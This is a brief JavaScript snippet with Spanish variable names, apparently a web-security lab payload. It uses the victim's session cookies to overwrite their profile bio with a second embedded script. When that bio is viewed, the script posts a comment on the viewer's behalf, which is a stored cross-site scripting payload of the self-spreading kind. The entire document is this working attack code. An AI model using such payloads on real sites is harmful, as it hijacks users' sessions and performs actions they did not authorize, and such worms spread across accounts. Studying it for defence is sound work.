(async () => {
  try {
    const contenido_text = `(async () => {
            try {
                const contenido_text = 'esto es un comentario super interesante';

                const body = new URLSearchParams();
                body.append('content', contenido_text);
                const resp = await fetch('/comment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: body.toString(),
                credentials: 'same-origin'
                });
                const text = await resp.text();
            } catch (err) {
                console.error(err);
            }
            })();'`;

    const body = new URLSearchParams();
    body.append('bio', contenido_text);
    const resp = await fetch('/profile', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: body.toString(),
      credentials: 'same-origin'
    });
    const text = await resp.text();
    console.log('Respuesta del servidor:', text);
  } catch (err) {
    console.error(err);
  }
})();